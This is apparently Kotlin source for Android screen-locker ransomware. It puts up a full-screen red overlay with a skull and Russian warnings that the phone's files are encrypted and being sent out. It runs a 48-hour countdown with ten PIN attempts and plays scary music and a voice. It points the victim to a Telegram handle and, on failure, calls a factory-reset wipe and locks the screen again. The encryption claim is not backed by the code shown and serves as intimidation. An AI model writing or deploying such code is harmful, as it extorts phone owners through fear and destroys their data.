package com.rocket.deadlinelock

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Handler
import android.os.Looper
import android.os.Vibrator
import android.os.VibrationEffect
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

class LockOverlay(private val context: Context) {
    private val wm = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private val handler = Handler(Looper.getMainLooper())
    private val music = ScaryMusic()
    private val voice = ScaryVoice(context)

    private var view: LinearLayout? = null
    private var timerText: TextView? = null
    private var attemptsText: TextView? = null
    private var input: EditText? = null
    private var btn: Button? = null

    private val correctPin = "137117295"
    private var attemptsLeft = 10
    private var secondsLeft = 48 * 60 * 60 
    private var lockedOut = false

    private val tick = object : Runnable {
        override fun run() {
            if (lockedOut) return
            secondsLeft--
            if (secondsLeft <= 0) {
                timerText?.text = "ВРЕМЯ ВЫШЛО"
                goBlackout()
                return
            }
            
            val h = secondsLeft / 3600
            val m = (secondsLeft % 3600) / 60
            val s = secondsLeft % 60
            timerText?.text = String.format("%02d:%02d:%02d", h, m, s)
            
            handler.postDelayed(this, 1000)
        }
    }

    fun show() {
        if (view != null) return
        
        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.parseColor("#CC0000"))
            setPadding(40, 40, 40, 40)
        }

        val skullIcon = TextView(context).apply {
            text = "☠"
            setTextColor(Color.BLACK)
            textSize = 120f
            gravity = Gravity.CENTER
        }

        val warn1 = TextView(context).apply {
            text = "ВСЕ ФАЙЛЫ ЗАШИФРОВАНЫ И ОТПРАВЛЯЮТСЯ В СЕТЬ..."
            setTextColor(Color.BLACK)
            textSize = 20f
            gravity = Gravity.CENTER
        }

        val warn2 = TextView(context).apply {
            text = "НЕ ПЕРЕЗАГРУЖАЙТЕ ТЕЛЕФОН!\nПРИ ПОПЫТКЕ ПЕРЕЗАГРУЗКИ ОН БУДЕТ ЗАБЛОКИРОВАН НАВСЕГДА."
            setTextColor(Color.BLACK)
            textSize = 14f
            gravity = Gravity.CENTER
            setPadding(0, 10, 0, 10)
        }

        val warn3 = TextView(context).apply {
            text = "ЕСЛИ НЕ ВВЕСТИ КОД, ТЕЛЕФОН СБРОСИТСЯ ДО ЗАВОДСКИХ НАСТРОЕК, И ВСЕ ДАННЫЕ БУДУТ СТЕРТЫ."
            setTextColor(Color.BLACK)
            textSize = 15f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 15)
        }

        val timerTitle = TextView(context).apply {
            text = "ОСТАЛОСЬ ВРЕМЕНИ:"
            setTextColor(Color.BLACK)
            textSize = 16f
            gravity = Gravity.CENTER
        }

        timerText = TextView(context).apply {
            text = "48:00:00"
            setTextColor(Color.BLACK)
            textSize = 40f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 15)
        }

        val attemptsTitle = TextView(context).apply {
            text = "ПОПЫТОК ВВОДА:"
            setTextColor(Color.BLACK)
            textSize = 16f
            gravity = Gravity.CENTER
        }

        attemptsText = TextView(context).apply {
            text = "10"
            setTextColor(Color.BLACK)
            textSize = 24f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 15)
        }

        input = EditText(context).apply {
            hint = "ВВЕДИТЕ КОД"
            setTextColor(Color.BLACK)
            setHintTextColor(Color.parseColor("#880000"))
            gravity = Gravity.CENTER
            textSize = 18f
            inputType = android.text.InputType.TYPE_CLASS_TEXT or
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD
            
            val bg = GradientDrawable().apply {
                setColor(Color.TRANSPARENT)
                setStroke(4, Color.BLACK)
                cornerRadius = 10f
            }
            background = bg
            setPadding(20, 20, 20, 20)
        }

        btn = Button(context).apply {
            text = "ПРОВЕРИТЬ"
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.BLACK)
            setPadding(20, 20, 20, 20)
            setOnClickListener { checkPassword() }
        }

        val tgBtn = Button(context).apply {
            text = "Написать в Telegram: @qwerty112005"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.BLACK)
            setOnClickListener {
                if (!AppLauncher.openTelegram(context))
                    attemptsText?.text = "TG не найден"
            }
        }

        val vpnBtn = Button(context).apply {
            text = "Включить VPN"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.BLACK)
            setOnClickListener {
                if (!AppLauncher.openVpn(context))
                    attemptsText?.text = "VPN не найден"
            }
        }

        root.addView(skullIcon)
        root.addView(warn1)
        root.addView(warn2)
        root.addView(warn3)
        root.addView(timerTitle)
        root.addView(timerText)
        root.addView(attemptsTitle)
        root.addView(attemptsText)
        root.addView(input)
        root.addView(btn)
        root.addView(tgBtn)
        root.addView(vpnBtn)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS, 
            PixelFormat.TRANSLUCENT
        )
        wm.addView(root, params)
        view = root

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            root.windowInsetsController?.hide(android.view.WindowInsets.Type.systemBars())
            root.windowInsetsController?.systemBarsBehavior = android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        } else {
            @Suppress("DEPRECATION")
            root.systemUiVisibility = android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
                    android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
                    android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        }

        music.start()
        voice.speak() // Запуск голоса
        handler.postDelayed(tick, 1000)
    }

    private fun checkPassword() {
        if (lockedOut) return
        if (input?.text.toString() == correctPin) unlock()
        else {
            attemptsLeft--
            attemptsText?.text = attemptsLeft.toString()
            input?.setText("")
            vibrate(400)
            if (attemptsLeft <= 0) {
                attemptsText?.text = "0 (СБРОС)"
                goBlackout()
            }
        }
    }

    private fun goBlackout() {
        if (lockedOut) return
        lockedOut = true
        handler.removeCallbacksAndMessages(null)
        music.stop()
        voice.stop()
        vibrate(1500)
        hide()
        FactoryReset.wipe(context)
        BlackoutOverlay(context).start {
            attemptsLeft = 10
            lockedOut = false
            secondsLeft = 48 * 60 * 60
            show()
        }
    }

    private fun unlock() {
        handler.removeCallbacksAndMessages(null)
        music.stop()
        voice.stop()
        hide()
    }

    fun hide() {
        view?.let { try { wm.removeView(it) } catch (_: Exception) {} }
        view = null
    }

    private fun vibrate(ms: Long) {
        val v = context.getSystemService(Context.VIBRATOR_SERVICE) as? Vibrator ?: return
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
            v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
        else @Suppress("DEPRECATION") v.vibrate(ms)
    }
}
